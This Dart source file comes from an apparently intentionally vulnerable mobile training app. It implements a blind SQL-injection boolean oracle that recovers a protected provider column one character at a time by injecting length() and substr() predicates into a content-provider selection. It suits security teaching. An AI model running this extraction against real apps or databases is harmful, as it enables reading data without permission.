/// Blind SQL-injection boolean-oracle extraction.
///
/// INTENTIONALLY VULNERABLE (CWE-89 / CWE-862): reproduces the app-layer pattern
/// behind the Android 17 Contacts-Provider blind SQLi (CVE-2026-28576). A
/// provider path concatenates the caller's selection clause into SQL with no
/// strict-SQL hardening, so a balanced sub-query in the selection is evaluated
/// as a `WHERE` predicate. The query returns rows (true) or none (false), giving
/// the caller a boolean oracle: with no direct read of the protected column and
/// no `READ_CONTACTS` grant, an attacker recovers it one character at a time.
///
/// On Android the oracle drives DVMA's real exported [VulnerableProvider] over
/// the app's ContentResolver, the same `secret`-column SQLite db reachable by
/// `adb shell content query` and drozer, so the extraction is real. Off-Android
/// (and under `flutter test`) it falls back to a local engine so the demo stays
/// deterministic and offline.
class BlindSqliOracle {
  /// The boolean oracle: returns true when the injected selection makes the
  /// provider return at least one row. Defaults to the offline engine; the
  /// screen supplies a real-provider oracle on Android.
  BlindSqliOracle({this.secret = 'DVMA{admin_flag-7f3a91}', this._rowExists});

  /// The protected value the offline oracle evaluates against. On a device the
  /// real value lives in the provider's SQLite db, not here.
  final String secret;

  final Future<bool> Function(String selection)? _rowExists;

  int probes = 0;

  Future<bool> _probe(String selection) {
    probes++;
    return _rowExists?.call(selection) ?? Future.value(_offlineEval(selection));
  }

  /// Offline predicate evaluator used when no real-provider oracle is supplied.
  bool _offlineEval(String selection) {
    final m = RegExp(
      r"substr\(\s*secret\s*,\s*(\d+)\s*,\s*1\s*\)\s*=\s*'(.)'",
      caseSensitive: false,
    ).firstMatch(selection);
    if (m != null) {
      final index = int.parse(m.group(1)!);
      return index >= 1 &&
          index <= secret.length &&
          secret[index - 1] == m.group(2)!;
    }
    if (RegExp(
          r"length\(\s*secret\s*\)\s*>\s*(\d+)",
          caseSensitive: false,
        ).firstMatch(selection)
        case final lm?) {
      return secret.length > int.parse(lm.group(1)!);
    }
    return false;
  }

  static const _alphabet =
      'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}_-.@';

  /// Recovers the protected column using only the boolean oracle, never reading
  /// it directly. Leaves [probes] at the request count so the caller can show
  /// the extraction cost.
  Future<String> extract({int maxLength = 64}) async {
    probes = 0;
    final out = StringBuffer();
    for (var i = 1; i <= maxLength; i++) {
      if (!await _probe('length(secret) > ${i - 1}')) break;
      for (final c in _alphabet.split('')) {
        if (await _probe("substr(secret,$i,1)='$c'")) {
          out.write(c);
          break;
        }
      }
    }
    return out.toString();
  }
}
